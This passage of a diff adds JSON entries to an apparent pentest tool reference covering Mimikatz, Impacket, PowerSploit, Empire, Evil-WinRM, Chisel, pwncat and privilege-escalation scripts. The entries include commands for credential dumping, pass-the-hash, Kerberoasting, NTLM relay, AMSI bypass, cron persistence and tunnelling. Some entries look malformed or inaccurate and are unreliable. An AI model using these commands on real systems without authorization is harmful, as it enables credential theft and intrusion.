+      },
+      {
+        "flag": "-s",
+        "description": "Save state file"
+      },
+      {
+        "flag": "-p",
+        "description": "Test password"
+      }
+    ],
+    "operational_tips": [
+      "Save state to resume long-running attacks.",
+      "Try dictionary attacks before brute force.",
+      "Use character sets based on password policies.",
+      "Document cracked passwords for evidence."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "mimikatz",
+    "name": "Mimikatz",
+    "summary": "Mimikatz is a powerful Windows post-exploitation tool that can extract plain text passwords, hash, PIN code and kerberos tickets from memory.",
+    "installation_guides": [
+      {
+        "platform": "Compile from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/gentilkiwi/mimikatz.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd mimikatz",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Extract credentials from memory",
+        "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+        "notes": []
+      },
+      {
+        "description": "Interactive mode",
+        "command": "mimikatz.exe",
+        "notes": []
+      },
+      {
+        "description": "Dump SAM database",
+        "command": "mimikatz.exe \"lsadump::sam\" exit",
+        "notes": []
+      },
+      {
+        "description": "Extract Kerberos tickets",
+        "command": "mimikatz.exe \"kerberos::list\" exit",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "privilege::debug",
+        "description": "Enable debug privileges"
+      },
+      {
+        "flag": "sekurlsa::logonpasswords",
+        "description": "Extract logon passwords"
+      },
+      {
+        "flag": "lsadump::sam",
+        "description": "Dump SAM database"
+      },
+      {
+        "flag": "kerberos::list",
+        "description": "List Kerberos tickets"
+      },
+      {
+        "flag": "crypto::certificates",
+        "description": "Extract certificates"
+      },
+      {
+        "flag": "vault::cred",
+        "description": "Extract vault credentials"
+      }
+    ],
+    "operational_tips": [
+      "Requires SYSTEM privileges for full functionality.",
+      "Use interactive mode for complex operations.",
+      "Document all extracted credentials securely.",
+      "Be aware of antivirus detection and mitigation."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "pspy",
+    "name": "Pspy",
+    "summary": "Pspy is a command line tool designed to snoop on processes without need for root permissions. It's useful for monitoring process activity.",
+    "installation_guides": [
+      {
+        "platform": "General",
+        "steps": [
+          {
+            "detail": "wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x pspy64",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Compile from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/DominicBreuker/pspy.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd pspy",
+            "copyable": true
+          },
+          {
+            "detail": "go build",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Monitor processes",
+        "command": "./pspy64",
+        "notes": []
+      },
+      {
+        "description": "Print commands only",
+        "command": "./pspy64 -pf",
+        "notes": []
+      },
+      {
+        "description": "Log to file",
+        "command": "./pspy64 -l /tmp/pspy.log",
+        "notes": []
+      },
+      {
+        "description": "Monitor specific user",
+        "command": "./pspy64 -u root",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-p",
+        "description": "Print commands"
+      },
+      {
+        "flag": "-f",
+        "description": "Print file system events"
+      },
+      {
+        "flag": "-l",
+        "description": "Log to file"
+      },
+      {
+        "flag": "-u",
+        "description": "Monitor specific user"
+      },
+      {
+        "flag": "-d",
+        "description": "Delay between scans"
+      }
+    ],
+    "operational_tips": [
+      "Good for discovering privilege escalation opportunities.",
+      "Monitor file system changes for sensitive files.",
+      "Combine with other tools for comprehensive monitoring.",
+      "Run for extended periods to catch periodic tasks."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "chisel",
+    "name": "Chisel",
+    "summary": "Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server.",
+    "installation_guides": [
+      {
+        "platform": "General",
+        "steps": [
+          {
+            "detail": "go install -v github.com/jpillora/chisel/cmd/chisel@latest",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Build from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/jpillora/chisel.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd chisel && go build",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Start chisel server",
+        "command": "chisel server --port 8080",
+        "notes": []
+      },
+      {
+        "description": "Connect to server",
+        "command": "chisel client server:8080 8080:127.0.0.1:3000",
+        "notes": []
+      },
+      {
+        "description": "SOCKS proxy",
+        "command": "chisel client server:8080 socks",
+        "notes": []
+      },
+      {
+        "description": "Reverse tunnel",
+        "command": "chisel client server:8080 R:9000:127.0.0.1:22",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "server",
+        "description": "Run as server"
+      },
+      {
+        "flag": "client",
+        "description": "Run as client"
+      },
+      {
+        "flag": "--port",
+        "description": "Server listening port"
+      },
+      {
+        "flag": "--reverse",
+        "description": "Reverse tunnel mode"
+      },
+      {
+        "flag": "--socks5",
+        "description": "SOCKS5 proxy mode"
+      },
+      {
+        "flag": "--auth",
+        "description": "Authentication"
+      }
+    ],
+    "operational_tips": [
+      "SOCKS proxy is useful for web application testing.",
+      "Secure tunneling with SSH authentication.",
+      "Monitor bandwidth usage on large transfers.",
+      "Use for bypassing network restrictions."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "ligolo-ng",
+    "name": "Ligolo-ng",
+    "summary": "Ligolo-ng is an advanced, simple, and powerful tunneling/pivoting tool that uses TUN interfaces.",
+    "installation_guides": [
+      {
+        "platform": "General",
+        "steps": [
+          {
+            "detail": "go install -v github.com/sysdream/ligolo-ng/cmd/proxy@latest",
+            "copyable": true
+          },
+          {
+            "detail": "go install -v github.com/sysdream/ligolo-ng/cmd/agent@latest",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Start proxy server",
+        "command": "proxy -h 0.0.0.0 -p 443",
+        "notes": []
+      },
+      {
+        "description": "Connect agent",
+        "command": "agent -connect 192.168.1.100:443",
+        "notes": []
+      },
+      {
+        "description": "Auto-reconnect",
+        "command": "agent -connect 192.168.1.100:443 --auto-reconnect",
+        "notes": []
+      },
+      {
+        "description": "Ignore certificates",
+        "command": "agent -connect 192.168.1.100:443 --ignore-cert",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-h",
+        "description": "Server host"
+      },
+      {
+        "flag": "-p",
+        "description": "Server port"
+      },
+      {
+        "flag": "-connect",
+        "description": "Connect to server"
+      },
+      {
+        "flag": "--auto-reconnect",
+        "description": "Auto-reconnect mode"
+      },
+      {
+        "flag": "--ignore-cert",
+        "description": "Ignore SSL certificates"
+      },
+      {
+        "flag": "--token",
+        "description": "Authentication token"
+      }
+    ],
+    "operational_tips": [
+      "Auto-reconnect is useful for unstable connections.",
+      "Ignore certificates for testing environments.",
+      "Monitor agent connections and traffic.",
+      "Use TUN interfaces for network pivoting."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "pwncat",
+    "name": "Pwncat",
+    "summary": "Pwncat is a post-exploitation framework that provides a reverse shell with advanced features like file transfer and persistence.",
+    "installation_guides": [
+      {
+        "platform": "General",
+        "steps": [
+          {
+            "detail": "pip3 install pwncat",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/calebstewart/pwncat.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd pwncat",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "python3 setup.py install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Start listener",
+        "command": "pwncat -l 4444",
+        "notes": []
+      },
+      {
+        "description": "Connect to target",
+        "command": "pwncat 192.168.1.100 4444",
+        "notes": []
+      },
+      {
+        "description": "Generate payload",
+        "command": "pwncat -g linux -o payload.sh",
+        "notes": []
+      },
+      {
+        "description": "Persist access",
+        "command": "# After connecting: persist add --user root --method cron",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-l",
+        "description": "Listen mode"
+      },
+      {
+        "flag": "-g",
+        "description": "Generate payload"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "--persist",
+        "description": "Persistence mechanism"
+      },
+      {
+        "flag": "--encrypt",
+        "description": "Encrypt connection"
+      }
+    ],
+    "operational_tips": [
+      "File transfer capabilities are very useful.",
+      "Built-in persistence options for access maintenance.",
+      "Encrypt connections for better security.",
+      "Document all post-exploitation activities."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "evil-winrm",
+    "name": "Evil-WinRM",
+    "summary": "Evil-WinRM is a WinRM shell for hacking/pentesting written in Ruby with features like file transfer and command execution.",
+    "installation_guides": [
+      {
+        "platform": "General",
+        "steps": [
+          {
+            "detail": "gem install evil-winrm",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/Hackplayers/evil-winrm.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd evil-winrm",
+            "copyable": true
+          },
+          {
+            "detail": "bundle install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic connection",
+        "command": "evil-winrm -i 192.168.1.100 -u admin -p password",
+        "notes": []
+      },
+      {
+        "description": "Hash authentication",
+        "command": "evil-winrm -i 192.168.1.100 -u admin -H 'hash'",
+        "notes": []
+      },
+      {
+        "description": "Use SSL",
+        "command": "evil-winrm -i 192.168.1.100 -u admin -p password -s",
+        "notes": []
+      },
+      {
+        "description": "File upload",
+        "command": "# After connecting: upload /local/file.txt C:\\temp\\file.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-i",
+        "description": "Target IP"
+      },
+      {
+        "flag": "-u",
+        "description": "Username"
+      },
+      {
+        "flag": "-p",
+        "description": "Password"
+      },
+      {
+        "flag": "-H",
+        "description": "NTLM hash"
+      },
+      {
+        "flag": "-s",
+        "description": "SSL connection"
+      },
+      {
+        "flag": "-P",
+        "description": "Port number"
+      }
+    ],
+    "operational_tips": [
+      "Hash authentication bypasses password requirements.",
+      "File transfer capabilities for data exfiltration.",
+      "Script execution for automation tasks.",
+      "Use SSL for encrypted communications."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "bloodhound-python",
+    "name": "BloodHound-Python",
+    "summary": "BloodHound-Python is a Python ingestor for BloodHound, used for Active Directory reconnaissance and attack path visualization.",
+    "installation_guides": [
+      {
+        "platform": "General",
+        "steps": [
+          {
+            "detail": "pip3 install bloodhound",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/fox-it/BloodHound.py.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd BloodHound.py",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Full collection",
+        "command": "bloodhound-python -c All -u admin -p password -d domain.local -ns 192.168.1.1",
+        "notes": []
+      },
+      {
+        "description": "Session collection only",
+        "command": "bloodhound-python -c Session -u admin -p password -d domain.local",
+        "notes": []
+      },
+      {
+        "description": "Use Kerberos auth",
+        "command": "bloodhound-python -c All -k -d domain.local -u admin@domain.local",
+        "notes": []
+      },
+      {
+        "description": "Save to specific directory",
+        "command": "bloodhound-python -c All -u admin -p password -d domain.local --output-dir /tmp/bloodhound",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-c",
+        "description": "Collection methods"
+      },
+      {
+        "flag": "-u",
+        "description": "Username"
+      },
+      {
+        "flag": "-p",
+        "description": "Password"
+      },
+      {
+        "flag": "-d",
+        "description": "Domain"
+      },
+      {
+        "flag": "-ns",
+        "description": "Name server"
+      },
+      {
+        "flag": "--output-dir",
+        "description": "Output directory"
+      },
+      {
+        "flag": "-k",
+        "description": "Kerberos authentication"
+      }
+    ],
+    "operational_tips": [
+      "Import data into BloodHound for visualization.",
+      "Document attack paths for privilege escalation.",
+      "Combine with other AD tools for complete picture.",
+      "Use appropriate collection methods for stealth."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "impacket-scripts",
+    "name": "Impacket Scripts",
+    "summary": "Impacket is a collection of Python classes for working with network protocols. Includes many useful scripts for pentesting.",
+    "installation_guides": [
+      {
+        "platform": "General",
+        "steps": [
+          {
+            "detail": "pip3 install impacket",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/SecureAuthCorp/impacket.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd impacket",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "python3 setup.py install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "SMB enumeration",
+        "command": "smbmap.py -H 192.168.1.100 -u admin -p password",
+        "notes": []
+      },
+      {
+        "description": "NTLM relay",
+        "command": "ntlmrelayx.py -tf targets.txt",
+        "notes": []
+      },
+      {
+        "description": "Kerberoasting",
+        "command": "GetUserSPNs.py -dc domain.local -domain.local",
+        "notes": []
+      },
+      {
+        "description": "Secretsdump",
+        "command": "secretsdump.py -hashes :hash@192.168.1.100",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-H",
+        "description": "Target host"
+      },
+      {
+        "flag": "-u",
+        "description": "Username"
+      },
+      {
+        "flag": "-p",
+        "description": "Password"
+      },
+      {
+        "flag": "-hashes",
+        "description": "NTLM hashes"
+      },
+      {
+        "flag": "-dc",
+        "description": "Domain controller"
+      },
+      {
+        "flag": "-smb2support",
+        "description": "Enable SMB2 support"
+      }
+    ],
+    "operational_tips": [
+      "Use for protocol-specific attacks and enumeration.",
+      "Combine with other tools for comprehensive testing.",
+      "Document all findings and attack paths.",
+      "Update regularly for latest protocol support."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "powersploit",
+    "name": "PowerSploit",
+    "summary": "PowerSploit is a collection of PowerShell modules that can be used to assist during penetration testing and post exploitation.",
+    "installation_guides": [
+      {
+        "platform": "General",
+        "steps": [
+          {
+            "detail": "Install-Module -Name PowerSploit -Scope CurrentUser",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Clone from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/PowerShellMafia/PowerSploit.git",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Load PowerShell module",
+        "command": "Import-Module .\\PowerSploit.psd1",
+        "notes": []
+      },
+      {
+        "description": "Invoke-Mimikatz",
+        "command": "Invoke-Mimikatz -DumpCreds",
+        "notes": []
+      },
+      {
+        "description": "PowerShell reverse shell",
+        "command": "Invoke-Shellcode -Shellcode \\$(shellcode)",
+        "notes": []
+      },
+      {
+        "description": "Bypass AMSI",
+        "command": "Invoke-AmsiBypass",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "Import-Module",
+        "description": "Load PowerShell module"
+      },
+      {
+        "flag": "-Force",
+        "description": "Force execution"
+      },
+      {
+        "flag": "-DumpCreds",
+        "description": "Dump credentials"
+      },
+      {
+        "flag": "-Shellcode",
+        "description": "Execute shellcode"
+      }
+    ],
+    "operational_tips": [
+      "Use for post-exploitation on Windows targets.",
+      "Many modules for different attack scenarios.",
+      "Be aware of modern PowerShell security features.",
+      "Document all module executions and results."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "empire",
+    "name": "Empire",
+    "summary": "Empire is a post-exploitation framework that includes agents, listeners, and modules for maintaining access.",
+    "installation_guides": [
+      {
+        "platform": "General",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/BC-SECURITY/Empire.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd Empire",
+            "copyable": true
+          },
+          {
+            "detail": "sudo ./setup/install.sh",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker installation",
+        "steps": [
+          {
+            "detail": "docker pull bcsecurity/empire:latest",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Launch Empire",
+        "command": "./empire",
+        "notes": []
+      },
+      {
+        "description": "Manage listeners",
+        "command": "listeners",
+        "notes": []
+      },
+      {
+        "description": "Generate agent",
+        "command": "uselistener http",
+        "notes": []
+      },
+      {
+        "description": "Execute resource script",
+        "command": "resource script.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "listeners",
+        "description": "Manage listeners"
+      },
+      {
+        "flag": "uselistener",
+        "description": "Create listener"
+      },
+      {
+        "flag": "agents",
+        "description": "Manage agents"
+      },
+      {
+        "flag": "usemodule",
+        "description": "Use module"
+      },
+      {
+        "flag": "resource",
+        "description": "Execute resource script"
+      }
+    ],
+    "operational_tips": [
+      "Generate multiple agent types for different targets.",
+      "Document all agent communications and activities.",
+      "Use encrypted communications for operational security.",
+      "Combine with other post-exploitation tools."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "linpeas",
+    "name": "LinPEAS",
+    "summary": "LinPEAS is a script that searches for possible paths to escalate privileges on Linux/Unix systems.",
+    "installation_guides": [
+      {
+        "platform": "Download from GitHub",
+        "steps": [
+          {
+            "detail": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x linpeas.sh",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Clone full repository",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/carlospolop/PEASS-ng.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd PEASS-ng/linPEAS",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Run basic scan",
+        "command": "./linpeas.sh",
+        "notes": []
+      },
+      {
+        "description": "Quiet mode",
+        "command": "./linpeas.sh -q",
+        "notes": []
+      },
+      {
+        "description": "Check specific options",
+        "command": "./linpeas.sh -o /tmp/output.txt",
+        "notes": []
+      },
+      {
+        "description": "With colors disabled",
+        "command": "./linpeas.sh -nocolors",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-q",
+        "description": "Quiet mode"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-nocolors",
+        "description": "Disable colors"
+      },
+      {
+        "flag": "-w",
+        "description": "Wait time between checks"
+      },
+      {
+        "flag": "-P",
+        "description": "Password for sudo"
+      }
+    ],
+    "operational_tips": [
+      "Run with different user contexts for comprehensive coverage.",
+      "Save output for later analysis and correlation.",
+      "Focus on high-severity findings first.",
+      "Document all potential escalation paths."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "winpeas",
+    "name": "WinPEAS",
+    "summary": "WinPEAS is a script that searches for possible paths to escalate privileges on Windows systems.",
+    "installation_guides": [
+      {
+        "platform": "Download from GitHub",
+        "steps": [
+          {
+            "detail": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Clone full repository",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/carlospolop/PEASS-ng.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd PEASS-ng/winPEAS",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Run basic scan",
+        "command": ".\\winPEAS.exe",
+        "notes": []
+      },
+      {
+        "description": "Check specific modules",
+        "command": ".\\winPEAS.exe systeminfo",
+        "notes": []
+      },
+      {
+        "description": "Quiet mode",
+        "command": ".\\winPEAS.exe quiet",
+        "notes": []
+      },
+      {
+        "description": "Output to file",
+        "command": ".\\winPEAS.exe output C:\\temp\\results.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "systeminfo",
+        "description": "System information"
+      },
+      {
+        "flag": "processinfo",
+        "description": "Process information"
+      },
+      {
+        "flag": "quiet",
+        "description": "Quiet mode"
+      },
+      {
+        "flag": "output",
+        "description": "Output file"
+      },
+      {
+        "flag": "notcolor",
+        "description": "No colors"
+      }
+    ],
+    "operational_tips": [
+      "Run with different privilege levels.",
+      "Focus on services and scheduled tasks.",
+      "Check for weak permissions and configurations.",
+      "Document all findings for remediation."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "linux-smart-enumeration",
+    "name": "Linux Smart Enumeration",
+    "summary": "Linux Smart Enumeration (lse) is a script for Linux enumeration focused on privilege escalation.",
+    "installation_guides": [
+      {
+        "platform": "Download from GitHub",
+        "steps": [
+          {
+            "detail": "wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x lse.sh",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Clone from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/diego-treitos/linux-smart-enumeration.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd linux-smart-enumeration",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Run basic enumeration",
+        "command": "./lse.sh",
+        "notes": []
+      },
+      {
+        "description": "Specify level",
+        "command": "./lse.sh -l 2",
+        "notes": []
+      },
+      {
+        "description": "Save output",
+        "command": "./lse.sh -o /tmp/lse_output.txt",
+        "notes": []
+      },
+      {
+        "description": "With sudo check",
+        "command": "./lse.sh -s",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-l",
+        "description": "Level of detail (1-3)"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-s",
+        "description": "Check sudo permissions"
+      },
+      {
+        "flag": "-i",
+        "description": "Information gathering only"
+      },
+      {
+        "flag": "-h",
+        "description": "Show help"
+      }
+    ],
+    "operational_tips": [
+      "Use higher levels for more comprehensive enumeration.",
+      "Combine with manual verification of findings.",
+      "Focus on SUID binaries and sudo permissions.",
+      "Document all potential privilege escalation vectors."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "linux-exploit-suggester",
+    "name": "Linux Exploit Suggester",
+    "summary": "Linux Exploit Suggester is a tool that suggests possible exploits for Linux systems based on kernel version.",
+    "installation_guides": [
+      {
+        "platform": "Install from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/mzet-/linux-exploit-suggester.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd linux-exploit-suggester",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x linux-exploit-suggester.sh",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Check for exploits",
+        "command": "./linux-exploit-suggester.sh",
+        "notes": []
+      },
+      {
+        "description": "With kernel version",
+        "command": "./linux-exploit-suggester.sh -k 4.15.0",
+        "notes": []
+      },
+      {
+        "description": "Detailed output",
+        "command": "./linux-exploit-suggester.sh -d",
+        "notes": []
+      },
+      {
+        "description": "Check URL only",
+        "command": "./linux-exploit-suggester.sh -u",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-k",
+        "description": "Kernel version"
+      },
+      {
+        "flag": "-d",
+        "description": "Detailed output"
+      },
+      {
+        "flag": "-u",
+        "description": "Check URL only"
+      },
+      {
+        "flag": "-f",
+        "description": "File with kernel info"
+      },
+      {
+        "flag": "-w",
+        "description": "Website to check"
+      }
+    ],
+    "operational_tips": [
+      "Always verify kernel version accurately.",
+      "Cross-reference exploits with vulnerability databases.",
+      "Test exploits in safe environments first.",
+      "Document all potential exploit paths."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "windows-exploit-suggester",
+    "name": "Windows Exploit Suggester",
+    "summary": "Windows Exploit Suggester is a tool that suggests possible exploits for Windows systems based on system information.",
+    "installation_guides": [
+      {
+        "platform": "Install from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/gellin/windows-exploit-suggester.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd windows-exploit-suggester",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "python3 windows-exploit-suggester.py --update",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Check for exploits",
+        "command": "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt",
+        "notes": []
+      },
+      {
+        "description": "Detailed output",
+        "command": "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt --detailed",
+        "notes": []
+      },
+      {
+        "description": "With cross-reference",
+        "command": "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt --cross-reference",
+        "notes": []
+      },
+      {
+        "description": "Update database",
+        "command": "python3 windows-exploit-suggester.py --update",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--systeminfo",
+        "description": "Systeminfo file"
+      },
+      {
+        "flag": "--detailed",
+        "description": "Detailed output"
+      },
+      {
+        "flag": "--cross-reference",
+        "description": "Cross-reference exploits"
+      },
+      {
+        "flag": "--update",
+        "description": "Update exploit database"
+      },
+      {
+        "flag": "--output",
+        "description": "Output file"
+      }
+    ],
+    "operational_tips": [
+      "Run systeminfo command to gather system data.",
+      "Keep exploit database updated regularly.",
+      "Cross-reference with multiple vulnerability sources.",
+      "Test exploits in controlled environments."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "crunch",
+    "name": "Crunch",
+    "summary": "Crunch is a wordlist generator where you can specify a character set and any other criteria for generating passwords.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install crunch",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/crunch-wordlist/crunch-wordlist.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd crunch-wordlist/CRUNCH",
+            "copyable": true
+          },
+          {
+            "detail": "make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Generate 8-character wordlist",
+        "command": "crunch 8 8",
+        "notes": []
+      },
+      {
+        "description": "With specific charset",
+        "command": "crunch 6 8 abcdef123",
+        "notes": []
+      },
+      {
+        "description": "Save to file",
+        "command": "crunch 8 8 -o wordlist.txt",
+        "notes": []
+      },
+      {
+        "description": "With pattern",
+        "command": "crunch 8 8 -t @@@@@@@@ -o pattern.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "<min>",
+        "description": "Minimum length"
+      },
+      {
+        "flag": "<max>",
+        "description": "Maximum length"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-t",
+        "description": "Pattern specification"
+      },
+      {
+        "flag": "-d",
+        "description": "Delay between characters"
+      },
+      {
+        "flag": "-b",
+        "description": "Maximum file size"
+      },
+      {
+        "flag": "-c",
+        "description": "Number of output files"
+      }
+    ],
+    "operational_tips": [
+      "Be mindful of disk space when generating large wordlists.",
+      "Use patterns for targeted password generation.",
+      "Combine with other tools for password cracking.",
+      "Consider storage requirements for large outputs."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "cewl",
+    "name": "CeWL",
+    "summary": "CeWL is a custom wordlist generator that spiders a target's website and creates wordlists for password cracking.",
+    "installation_guides": [
+      {
+        "platform": "Install from gem",
+        "steps": [
+          {
